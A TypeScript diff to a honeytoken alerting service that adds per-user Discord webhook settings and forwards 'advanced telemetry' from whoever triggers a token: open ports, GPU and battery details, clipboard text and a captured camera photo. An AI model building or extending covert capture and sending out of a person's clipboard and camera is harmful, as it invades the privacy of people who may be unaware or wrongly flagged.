@@ -155,21 +155,43 @@ async function sendNtfyNotification(alert: Alert, userId: string, isTelemetry: b
   }
 }
 
-async function sendDiscordWebhook(alert: Alert, isTelemetry: boolean = false) {
-  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-  if (!webhookUrl) return;
+async function sendDiscordWebhook(alert: Alert, user_id: string, isTelemetry: boolean = false) {
+  let webhookUrl = process.env.DISCORD_WEBHOOK_URL;
   
+  const redis = getRedis();
+  if (redis) {
+    try {
+      const settingsStr = await redis.get(`settings:${user_id}`);
+      if (settingsStr) {
+        const settings = JSON.parse(settingsStr);
+        if (settings.discord_webhook) webhookUrl = settings.discord_webhook;
+      }
+    } catch(e) {}
+  }
+  
+  if (!webhookUrl) return;
+
+  const fields = [
+    { name: "Token Name", value: alert.token_name || "Unknown", inline: true },
+    { name: "Threat ID", value: alert.threat_id || (isTelemetry ? "Unknown" : "Pending..."), inline: true },
+    { name: "IP Address", value: alert.attacker_ip || "Unknown", inline: true },
+    { name: "Location", value: alert.location || "Unknown", inline: true },
+    { name: "Device OS", value: alert.os_platform || "Unknown", inline: true },
+    { name: "Target Context", value: alert.memo || "None", inline: false }
+  ];
+
+  if (isTelemetry) {
+    if (alert.gpu_renderer) fields.push({ name: "GPU Renderer", value: alert.gpu_renderer, inline: true });
+    if (alert.battery_level) fields.push({ name: "Battery", value: alert.battery_level, inline: true });
+    if (alert.open_ports && alert.open_ports.length > 0) fields.push({ name: "Open Ports", value: alert.open_ports.join(', '), inline: false });
+    if (alert.clipboard_text) fields.push({ name: "Clipboard", value: alert.clipboard_text.substring(0, 1000), inline: false });
+    if (alert.camera_image) fields.push({ name: "Camera", value: "Photo Captured (Check Dashboard)", inline: true });
+  }
+
   const embed = {
     title: isTelemetry ? "🚨 Advanced Telemetry Recovered" : "🚨 Tripwire Triggered!",
     color: isTelemetry ? 0x9c27b0 : 0xff0000,
-    fields: [
-      { name: "Token Name", value: alert.token_name || "Unknown", inline: true },
-      { name: "Threat ID", value: alert.threat_id || (isTelemetry ? "Unknown" : "Pending..."), inline: true },
-      { name: "IP Address", value: alert.attacker_ip || "Unknown", inline: true },
-      { name: "Location", value: alert.location || "Unknown", inline: true },
-      { name: "Device OS", value: alert.os_platform || "Unknown", inline: true },
-      { name: "Target Context", value: alert.memo || "None", inline: false }
-    ],
+    fields: fields,
     timestamp: new Date().toISOString()
   };
 
@@ -204,7 +226,7 @@ export async function createAlert(token_id: string, attacker_ip: string, user_ag
       await redis.ltrim(`alerts:${user_id}`, 0, 49);
       
       // Fire initial webhooks
-      await sendDiscordWebhook(newAlert, false);
+      await sendDiscordWebhook(newAlert, user_id, false);
       await sendNtfyNotification(newAlert, user_id, false);
     }
   } catch (err) {
@@ -246,7 +268,7 @@ export async function updateAlertDetails(alert_id: string, details: Partial<Aler
     if (result && typeof result === 'string') {
       const updatedAlert = JSON.parse(result);
       // Fire secondary telemetry webhooks
-      await sendDiscordWebhook(updatedAlert, true);
+      await sendDiscordWebhook(updatedAlert, user_id, true);
       await sendNtfyNotification(updatedAlert, user_id, true);
     }
   } catch (err) {
